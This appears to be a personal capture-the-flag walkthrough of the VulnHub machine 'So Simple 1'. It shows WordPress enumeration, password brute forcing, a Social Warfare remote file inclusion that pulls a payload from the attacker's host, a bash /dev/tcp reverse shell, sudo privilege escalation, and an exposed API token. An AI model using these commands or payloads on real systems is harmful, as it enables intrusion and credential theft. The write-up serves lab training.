Description

[Back to the Top](https://www.vulnhub.com/entry/so-simple-1,515/#top)

This is an easy level VM with some rabbitholes. Enumeration is key to find your way in. There are three flags (2 user and 1 root flag).

The VM is tested on Virtualbox. After the startup it shows the IP address.

Share your rootflag with me on Twitter: @roelvb79

Good luck and have fun!

This works better with VirtualBox rather than VMware

貼り付け元  \<https://www.vulnhub.com/entry/so-simple-1,515/>

**Service Enumeration**

Host Discover

└─# nmap -sn -T4 192.168.56.0/24

![[So-Simple-1 image.png]]

I found the target IP address that 192.168.56.106.

Service Enumeration

└─# nmap -p- -T4 192.168.56.106

![[So-Simple-1 image 1.png]]

I found ports that 22 and 80.

We will investigate further and confirm the details.

└─# nmap -sV -sC -p22 192.168.56.106

![[So-Simple-1 image 2.png]]

└─# nmap -sV -sC -p80 192.168.56.106

![[So-Simple-1 image 3.png]]

└─# nmap --script vuln -p80 192.168.56.106

![[So-Simple-1 image 4.png]]

└─# nikto -h 192.168.56.106

![[So-Simple-1 image 5.png]]

Directory Enumeration

└─# gobuster dir -u http://192.168.56.106/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --no-error -t 50

![[So-Simple-1 image 6.png]]

└─# dirb http://192.168.56.106

![[So-Simple-1 image 7.png]]

Browser access

http://192.168.56.106

![[So-Simple-1 image 8.png]]

http://192.168.56.106/wordpress/uploads/

![[So-Simple-1 image 9.png]]

From the results of some research, we found that the webserver uses WordPress, so we will scan it specifically for WordPress.

└─# wpscan --url http://192.168.56.106/wordpress

![[So-Simple-1 image 10.png]]

![[So-Simple-1 image 11.png]]

![[So-Simple-1 image 12.png]]

![[So-Simple-1 image 13.png]]

└─# wpscan --url http://192.168.56.106/wordpress/ -P /usr/share/wordlists/rockyou.txt --usernames max

![[So-Simple-1 image 14.png]]

max opensesame

![[So-Simple-1 image 15.png]]

![[So-Simple-1 image 16.png]]

└─# wpscan --url http://192.168.56.106/wordpress/ --api-token 5GCgOQqfaHiLAL2JZfQKKCXUEp9wlhxY1o5VYZDDJSU -e u,vp

![[So-Simple-1 image 17.png]]

└─# searchsploit warfare wordpress

![[So-Simple-1 image 18.png]]

![[So-Simple-1 image 19.png]]

Lets TEST

└─# vim exploit.txt

![[So-Simple-1 image 20.png]]

└─# python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

http://192.168.56.106/wordpress/wp-admin//admin-post.php?swp_debug=load_options&swp_url=http://192.168.56.99:8000/exploit.txt

![[So-Simple-1 image 21.png]]

![[So-Simple-1 image 22.png]]

**Initial Access**

└─$ nc -nlvp 4444

\<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.56.106/4444 0>&1'")\</pre>

http://192.168.56.106/wordpress/wp-admin//admin-post.php?swp_debug=load_options&swp_url=http://192.168.56.99:8000/reverse-shell.txt

![[So-Simple-1 image 23.png]]

![[So-Simple-1 image 24.png]]

![[So-Simple-1 image 25.png]]

![[So-Simple-1 image 26.png]]

max@so-simple:~$ sudo -u steven /usr/sbin/service ../../bin/sh

![[So-Simple-1 image 27.png]]

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

steven@so-simple:/home/steven$ cat user2.txt

steven@so-simple:/$ id

![[So-Simple-1 image 28.png]]

![[So-Simple-1 image 29.png]]

**Privilege Escalation**

steven@so-simple:/home/steven$ sudo -l

![[So-Simple-1 image 30.png]]

steven@so-simple:/home/steven$ mkdir /opt/tools

steven@so-simple:/home/steven$ cd /opt/tools/

steven@so-simple:/opt/tools$ touch server-health.sh

steven@so-simple:/opt/tools$ vim server-health.sh

#!/bin/bash

bash

steven@so-simple:/opt/tools$ chmod 777 server-health.sh

steven@so-simple:/opt/tools$ sudo -u root /opt/tools/server-health.sh

root@so-simple:/opt/tools# id

uid=0(root) gid=0(root) groups=0(root)

root@so-simple:/opt/tools# cd /root

root@so-simple:~# ls

flag.txt  snap

root@so-simple:~# cat flag.txt

![[So-Simple-1 image 31.png]]